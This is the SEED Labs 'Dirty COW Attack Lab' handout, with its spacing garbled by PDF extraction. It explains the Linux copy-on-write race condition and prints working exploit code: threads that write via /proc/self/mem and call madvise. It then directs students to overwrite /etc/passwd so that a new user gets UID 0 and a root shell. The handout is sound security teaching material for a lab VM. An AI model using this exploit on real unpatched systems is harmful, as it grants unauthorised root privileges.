SEEDLabsŒDirtyCOWAttackLab 1 DirtyCOWAttackLab Copyright©2017WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1718086.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1LabOverview TheDirtyCOWvulnerabilityisaninterestingcaseoftheraceconditionvulnerability.Itexistedinthe Linux kernelsinceSeptember2007 andwasdiscoveredandexploitedinOctober2016.Thevulnerability affectsall Linux -basedoperatingsystems includingAndroid anditsconsequenceisverysevere attackers cangaintherootprivilegebyexploitingthevulnerability.Thevulnerabilityresidesinthecodeofcopy-on- writeinside Linux kernel.Byexploitingthisvulnerability attackerscanmodifyanyprotectedeven thoughtheseareonlyreadabletothem.ThecompanionbookoftheSEEDlabs ComputerSecurity A Hands-onApproach byWenliangDu hasadetailedexplanationonthisvulnerability Chapter8 Theobjectiveofthislabisforstudentstogainthehands-onexperienceontheDirtyCOWattack understandtheraceconditionvulnerabilityexploitedbytheattack andgainadeeperunderstandingofthe generalraceconditionsecurityproblems.Inthislab studentswillexploittheDirtyCOWracecondition vulnerabilitytogaintherootprivilege Readingsandrelatedtopics DetailedcoverageoftheDirtyCOWattackcanbefoundinChapter8of theSEEDbook ComputerSecurity AHands-onApproach byWenliangDu Labenvironment Thislabhasbeentestedonourpre-builtUbuntu12.04VM whichcanbedownloaded fromtheSEEDwebsite.IfyouareusingourSEEDUbuntu16.04VM thisattackwillnotwork thevulnerabilityhasalreadybeenpatchedinthekernel.YoucandownloadtheSEEDUbuntu12.04VM fromtheSEEDwebsite.IfyouhaveanAmazonEC2account youcanourVMfromtheﬁCommunity AMIsﬂ.ThenameoftheVMis SEEDUbuntu12.04-Generic .ItshouldbenotedthatAmazon'ssite saysthatthisisa64-bitVM thatisincorrect.TheVMis32-bit.However thisincorrectinformationdoes notcauseanyproblem 2Task1 ModifyaDummyRead-OnlyFile Theobjectiveofthistaskistowritetoaread-onlyusingtheDirtyCOWvulnerability 2.1CreateaDummyFile WeneedtoselectatargetAlthoughthiscanbeanyread-onlyinthesystem wewilluse adummyinthistask sowedonotcorruptanimportantsystemincasewemakeamistake.Please createacalled zzz intherootdirectory changeitspermissiontoread-onlyfornormalusers andput somerandomcontentintotheusinganeditorsuchas gedit SEEDLabsŒDirtyCOWAttackLab 2 $ sudotouch/zzz $ sudochmod644/zzz $ sudogedit/zzz $ cat/zzz 111111222222333333 $ ls-l/zzz -rw-r -- r -- 1rootroot19Oct1822:03/zzz $ echo99999 > /zzz bash /zzz Permissiondenied Fromtheaboveexperiment wecanseethatifwetrytowritetothisasanormaluser wewillfail becausetheisonlyreadabletonormalusers.However becauseoftheDirtyCOWvulnerabilityinthe system wecanawaytowritetothisOurobjectiveistoreplacethepattern '' 222222 '' '' ****** '' 2.2SetUptheMemoryMappingThread Youcandownloadtheprogram cow attack.c fromthewebsiteofthelab.Theprogramhasthreethreads themainthread thewritethread andthemadvisethread.Themainthreadmaps /zzz tomemory wherethepattern '' 222222 '' andthencreatestwothreadstoexploittheDirtyCOWracecondition vulnerabilityintheOSkernel Listing1 Themainthread * cow_attack.c themainthread * # include < sys/mman.h > # include < fcntl.h > # include < pthread.h > # include < sys/stat.h > # include < string.h > void * map intmain intargc char * argv { pthread_tpth1 pth2 structstatst intfile_size //Openthetargetfileintheread-onlymode intf=open `` /zzz '' O_RDONLY //MapthefiletoCOWmemoryusingMAP_PRIVATE fstat f & st file_size=st.st_size map=mmap NULL file_size PROT_READ MAP_PRIVATE f,0 //Findthepositionofthetargetarea char * position=strstr map '' 222222 '' À //Wehavetodotheattackusingtwothreads pthread_create & pth1 NULL madviseThread void * file_size Á SEEDLabsŒDirtyCOWAttackLab 3 pthread_create & pth2 NULL writeThread position Â //Waitforthethreadstofinish pthread_join pth1 NULL pthread_join pth2 NULL return0 } Intheabovecode weneedtowherethepattern '' 222222 '' is.Weuseastringfunctioncalled strstr towhere '' 222222 '' isinthemappedmemory Line À .Wethenstarttwothreads madviseThread Line Á writeThread Line Â 2.3SetUpthe write Thread Thejobofthe write threadlistedinthefollowingistoreplacethestring '' 222222 '' inthememorywith '' ****** '' .SincethemappedmemoryisofCOWtype thisthreadalonewillonlybeabletomodifythe contentsinacopyofthemappedmemory whichwillnotcauseanychangetotheunderlying /zzz Listing2 The write thread * cow_attack.c thewritethread * void * writeThread void * arg { char * content= '' ****** '' off_toffset= off_t arg intf=open `` /proc/self/mem '' O_RDWR 1 { //Movethefilepointertothecorrespondingposition lseek f offset SEEK_SET //Writetothememory write f content strlen content } } 2.4The madvise Thread The madvise threaddoesonlyonething discardingtheprivatecopyofthemappedmemory sothepage tablecanpointbacktotheoriginalmappedmemory Listing3 The madvise thread * cow_attack.c themadvisethread * void * madviseThread void * arg { intfile_size= int arg 1 { madvise map file_size MADV_DONTNEED } } SEEDLabsŒDirtyCOWAttackLab 4 2.5LaunchtheAttack Ifthe write andthe madvise systemcallsareinvokedalternatively i.e. oneisinvokedonlyafter theotheristhe write operationwillalwaysbeperformedontheprivatecopy andwewillnever beabletomodifythetargetTheonlywayfortheattacktosucceedistoperformthe madvise systemcallwhilethe write systemcallisstillrunning.Wecannotalwaysachievethat soweneed totrymanytimes.Aslongastheprobabilityisnotextremelylow wehaveachance.Thatiswhyinthe threads werunthetwosystemcallsinanteloop.Compilethe cow attack.c andrunitforafew seconds.Ifyourattackissuccessful youshouldbeabletoseea /zzz Reportyourresultsin thelabreportandexplainhowyouareabletoachievethat $ gcccow_attack.c-lpthread $ a.out ... pressCtrl-Cafterafewseconds ... 3Task2 ModifythePasswordFiletoGaintheRootPrivilege Now let'slaunchtheattackonarealsystemsowecangaintherootprivilege.Wechoosethe /etc/passwd asourtargetThisisworld-readable butnon-rootuserscannotmodifyit Thecontainstheuseraccountinformation onerecordforeachuser.Assumethatourusernameis seed .Thefollowinglinesshowtherecordsforrootand seed root x:0:0 root /root /bin/bash seed x:1000:1000 Seed,123 /home/seed /bin/bash Eachoftheaboverecordcontainssevencolon-separatedOurinterestisonthethirdwhich theuserID UID valueassignedtoauser.UIDistheprimarybasisforaccesscontrolin Linux sothisvalueiscriticaltosecurity.Therootuser'sUIDcontainsaspecialvalue0 thatiswhatmakes itthesuperuser notitsname.AnyuserwithUID 0 istreatedbythesystemasroot regardlessofwhatuser nameheorshehas.The seed user'sIDisonly 1000 soitdoesnothavetherootprivilege.However ifwecanchangethevalueto 0 wecanturnitintoroot.WewillexploittheDirtyCOWvulnerabilityto achievethisgoal Inourexperiment wewillnotusethe seed account becausethisaccountisusedformostofthe experimentsinthisbook ifweforgettochangetheUIDbackaftertheexperiment otherexperimentswill beaffected.Instead wecreateanewaccountcalled charlie andwewillturnthisnormaluserintoroot usingtheDirtyCOWattack.Addinganewaccountcanbeachievedusingthe adduser command.After theaccountiscreated anewrecordwillbeaddedto /etc/passwd .Seethefollowing $ sudoaddusercharlie ... $ cat/etc/passwd|grepcharlie charlie x:1001:1001 /home/charlie /bin/bash Wesuggestthatyousaveacopyofthe /etc/passwd justincaseyoumakeamistakeandcorrupt this.AnalternativeistotakeasnapshotofyourVMbeforeworkingonthislab soyoucanalwaysroll backiftheVMgotcorrupted Task Youneedtomodifythe charlie 'sentryin /etc/passwd sothethirdischangedfrom 1001 0000 essentiallyturning charlie intoarootaccount.Theisnotwritableto charlie SEEDLabsŒDirtyCOWAttackLab 5 wecanusetheDirtyCOWattacktowritetothisYoucanmodifythe cow attack.c programfrom Task1toachievethisgoal Afteryourattackissuccessful ifyouswitchuserto charlie youshouldbeabletoseethe # signat theshellprompt whichisanindicatoroftherootshell.Ifyourunthe id command youshouldbeableto seethatyouhavegainedtherootprivilege seed @ ubuntu $ sucharlie Passwd root @ ubuntu # id uid=0 root gid=1001 charlie groups=0 root ,1001 charlie 4Submission Youneedtosubmitadetailedlabreporttodescribewhatyouhavedoneandwhatyouhaveobserved Pleaseprovidedetailsusingscreenshotsandcodesnippets.Youalsoneedtoprovideexplanationtothe observationsthatareinterestingorsurprising 